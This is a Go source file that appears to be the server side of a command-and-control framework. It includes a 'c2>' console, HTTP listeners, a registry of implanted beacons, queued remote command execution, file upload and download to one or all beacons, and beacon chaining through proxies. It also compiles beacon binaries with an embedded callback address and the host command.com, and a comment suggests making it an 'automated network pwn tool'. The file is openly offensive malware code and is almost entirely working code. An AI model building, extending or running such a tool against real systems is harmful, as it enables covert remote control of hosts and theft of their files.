package main

import (
	"fmt"
	"time"
	"net"
	"log"
	"encoding/json"
	"strconv"
	"os"
	"os/exec"
	"math/rand"
	"strings"
	"bufio"
)

type CommandUpdate struct {
	Ip string
	Id string
	Type string
	Data string
}

type Beacon struct {
	Ip string
	Id string
	ExecBuffer []string
	DownloadBuffer []string
	UploadBuffer []string
	ProxyClientBuffer []string
	LastSeen time.Time
}

const idBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

var idLen int = 8
var listeners []*HttpListener = make([]*HttpListener, 0)
var beacons []*Beacon = make([]*Beacon, 0)
var activeBeacon *Beacon
var cmdArgs = map[string]string {
    "help": "<command>...",
	"list": "",
	"listeners": "",
	"httplistener": "<iface> <hostname> <port>",
    "exec": "<beacon id OR index> <command>...",
    "create": "<listener>",
	"download": "<beacon id OR index> <remote file> OR <remote file>...",
	"upload": "<beacon id OR index> <local file> OR <local file>...",
	"use": "<beacon id OR index>",
	"script": "<beacon id OR index> <local file path> <remote executor path>",
}

/*


potentially turn into automated network pwn tool?


*/

func getIfaceIp(iface string) (string) {
	ief, _ := net.InterfaceByName(iface)
	addrs, _ := ief.Addrs()
	return strings.Split(addrs[0].String(), "/")[0]
}

func registerBeacon(updateData CommandUpdate) (*Beacon) {
	var beacon *Beacon
	for _, b := range beacons {
		if b.Id == updateData.Id {
			beacon = b 
		}
	}

	if beacon == nil {
		beacon = &Beacon{updateData.Ip, updateData.Id, nil, nil, nil, nil, time.Now()}
		beacons = append(beacons, beacon)
	} else {
		beacon.LastSeen = time.Now()
	}

	return beacon
}

func listBeacons() {
	for i, b := range beacons {
		fmt.Println("[" + strconv.Itoa(i) + "] " + b.Id + "@" + b.Ip + " last seen " + b.LastSeen.String())
	}
}

func createBeacon(listener int) {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Proxy? (y/n): ")
	input, err := reader.ReadString('\n')
	ip := getIfaceIp(listeners[listener].Iface)
	port := strconv.Itoa(listeners[listener].Port)
	beaconName := "beacon" + ip + "." + port	
	beaconId := genRandID()

	if err != nil {
		log.Fatal(err)
	}

	if input == "y\n" {
		if len(beacons) == 0 {
			fmt.Println("No beacons to proxy to.")
			return
		}
		listBeacons()
		fmt.Print("Choose beacon: ")
		input, err := reader.ReadString('\n')
		input = strings.ReplaceAll(input, "\n", "")

		if err != nil {
			fmt.Println("Invalid input.")
			return
		}
		
		beacon := getBeaconByIdOrIndex(input)

		if beacon == nil {
			fmt.Println(input + " is not a beacon.")
			return
		}

		notifyBeaconOfProxyUpdate(beacon, beaconId)

		fmt.Println("Using beacon " + beacon.Id + "@" + beacon.Ip + " as proxy.")
		exec.Command("/bin/sh", "-c", "env CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags '-X main.id=" + beaconId + " -X main.cmdProxyId=" + beacon.Id + " -X main.cmdProxyIp=" + beacon.Ip + " -X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o out/" + beaconName + " beacon/*.go").Output()
	} else {
		fmt.Println("No proxy")
		exec.Command("/bin/sh", "-c", "env CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags '-X main.id=" + beaconId + " -X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o out/" + beaconName + " beacon/*.go").Output()
	}

	fmt.Println("Saved beacon for listener " + getIfaceIp(listeners[listener].Iface) + ":" + strconv.Itoa(listeners[listener].Port) + "%" + listeners[listener].Iface + " to out/" + beaconName + ".")
}

func genRandID() string {
	rand.Seed(time.Now().UTC().UnixNano())
    b := make([]byte, idLen)
    
	for i := range b {
        b[i] = idBytes[rand.Intn(len(idBytes))]
    }
    
	return string(b)
}

func execOnBeacon(cmd []string) {
	if cmd[1] == "*" {
		for _, b := range beacons {
			b.ExecBuffer = append(b.ExecBuffer, strings.Join(cmd[2:], " "))
		}
		return	
	}

	var beacon *Beacon = activeBeacon
	var cmdIndex = 1
	if beacon == nil {
		beacon = getBeaconByIdOrIndex(cmd[1])
		cmdIndex = 2
	}

	if beacon != nil {
		beacon.ExecBuffer = append(beacon.ExecBuffer, strings.Join(cmd[cmdIndex:], " "))
		fmt.Println("Added exec command to buffer for beacon " + beacon.Id + "@" + beacon.Ip)
	} else {
		fmt.Println("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
	}
}

func downloadFile(cmd []string) {
	if cmd[1] == "*" {
		for _, b := range beacons {
			b.DownloadBuffer = append(b.DownloadBuffer, cmd[2])
		}
		return	
	}

	var beacon *Beacon = activeBeacon
	var cmdIndex = 1
	if beacon == nil {
		beacon = getBeaconByIdOrIndex(cmd[1])
		cmdIndex = 2
	}

	if beacon != nil {
		beacon.DownloadBuffer = append(beacon.DownloadBuffer, cmd[cmdIndex])
		fmt.Println("Added download command for beacon " + beacon.Id + "@" + beacon.Ip)
	} else {
		fmt.Println("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
	}
}

func uploadFile(cmd []string) {
	if cmd[1] == "*" {
		for _, b := range beacons {
			b.UploadBuffer = append(b.UploadBuffer, cmd[2])
		}
		return	
	}

	var beacon *Beacon = activeBeacon
	var cmdIndex = 1
	if beacon == nil {
		beacon = getBeaconByIdOrIndex(cmd[1])
		cmdIndex = 2
	}

	if beacon != nil {
		beacon.UploadBuffer = append(beacon.UploadBuffer, cmd[cmdIndex])
		fmt.Println("Added upload command for beacon " + beacon.Id + "@" + beacon.Ip)
	} else {
		fmt.Println("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
	}
}

func getBeaconByIdOrIndex(id string) (*Beacon) {
	var beacon *Beacon

	for _, b := range beacons {
		if b.Id == id {
			beacon = b
		}
	}

	bId, err := strconv.Atoi(id)
	
	if beacon != nil || (err == nil && bId < len(beacons)) {
		if beacon == nil {
			beacon = beacons[bId]
		}
		return beacon
	} else {
		return nil
	}
}

func checkArgs(cmd[] string) (bool) {
	if cmdArgs[cmd[0]] == "" {
		return true
	}

	amt := strings.Count(cmdArgs[cmd[0]], "<")
	if len(cmd[1:]) != amt && !strings.Contains(cmdArgs[cmd[0]], "...") {
		if amt == 1 {
			fmt.Println(cmd[0] + " requires " + strconv.Itoa(amt) + " arg: " + cmdArgs[cmd[0]])
		} else {
			fmt.Println(cmd[0] + " requires " + strconv.Itoa(amt) + " args: " + cmdArgs[cmd[0]])
		}
		return false
	}
	return true
}

func printHelp(cmd []string) {
	if len(cmd) == 2 {
		if val, ok := cmdArgs[cmd[1]]; ok {
			fmt.Println(cmd[1] + " usage: " + strings.ReplaceAll(val, "...", ""))
		} else {
			fmt.Println("Command " + cmd[0] + " does not exist.")
		}
	} else {
		for key, val := range cmdArgs {
			fmt.Println(key + " " + strings.ReplaceAll(val, "...", ""))
		}
	}
}

func startHttpListener(cmd []string) {
	port, err := strconv.Atoi(cmd[3])

	if err != nil {
		fmt.Println("usage: " + cmdArgs["httplistener"])
		return
	}

	var HttpListener = HttpListener {
		Iface: cmd[1],
		Hostname: cmd[2],
		Port: port,
	}

	err = HttpListener.startListener()
	if err != nil {
		fmt.Println("Failed to start http server.")
	}

	fmt.Println("Started HTTP listener for " + getIfaceIp(HttpListener.Iface) + ":" + cmd[3])
	listeners = append(listeners, &HttpListener)
}

func listListeners() {
	fmt.Println("---- HTTP Listeners ----")
	for i, listener := range listeners {
		fmt.Println("[" + strconv.Itoa(i) + "] " + getIfaceIp(listener.Iface) + ":" + strconv.Itoa(listener.Port) + " (" + listener.Iface + ")")
	}
}

func notifyBeaconOfProxyUpdate(proxy *Beacon, targetId string) {
	pseudoBeacon := Beacon { "0.0.0.0", targetId, nil, nil, nil, nil, time.Now() }
	data, err := json.Marshal(pseudoBeacon)
	
	if err != nil {
		fmt.Println("Failed to notify beacon of proxy update.")
		return
	}

	proxy.ProxyClientBuffer = append(proxy.ProxyClientBuffer, string(data))
}

func processInput(input string) {
	cmd := strings.Fields(input);
	if len(cmd) > 0 && checkArgs(cmd) {
		switch cmd[0] {
		//case "script":
			//uploadAndExec(cmd)
		case "listeners":
			listListeners()
		case "httplistener":
			startHttpListener(cmd)
		case "exec":
			execOnBeacon(cmd)
		case "create":
			l, err := strconv.Atoi(cmd[1])
			if err != nil {
				fmt.Println("usage: " + cmdArgs["create"])
				return
			}
			if len(listeners) <= l || l < 0 {
				fmt.Println("Listener " + cmd[1] + " does not exist, list existing listeners with 'listeners'")
				return
			}
			createBeacon(l)
		case "list":
			listBeacons()
		case "upload":
			uploadFile(cmd)
		case "download":
			downloadFile(cmd)
		case "use":
			activeBeacon = getBeaconByIdOrIndex(cmd[1])
			if activeBeacon == nil {
				fmt.Println("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
			}
		case "help":
			printHelp(cmd)
		default:
			fmt.Println(cmd[0] + " is not a command. Use help to show available commands.")
		}
	}
}

func prompt() {
	if activeBeacon != nil {
		fmt.Print(activeBeacon.Id + "@" + activeBeacon.Ip + " ")
	}

	fmt.Print("c2> ")
}

func handleInput() {
	reader := bufio.NewReader(os.Stdin)
	for {
		prompt()
		input, err := reader.ReadString('\n')

        if err != nil {
            fmt.Fprintln(os.Stderr, err)
        }

		processInput(input)
	}
}

func main() {
	var WebInterface = WebInterface {
		port: 8000,
	}

	var err = WebInterface.startListener()
	if err != nil {
		fmt.Println("Failed to start web interface.")
	}

	var HttpListener = HttpListener {
		Iface: "tun0",
		Hostname: "command.com",
		Port: 8001,
	}

	err = HttpListener.startListener()
	if err != nil {
		fmt.Println("Failed to start http server.")
	}

	listeners = append(listeners, &HttpListener)
	handleInput()
}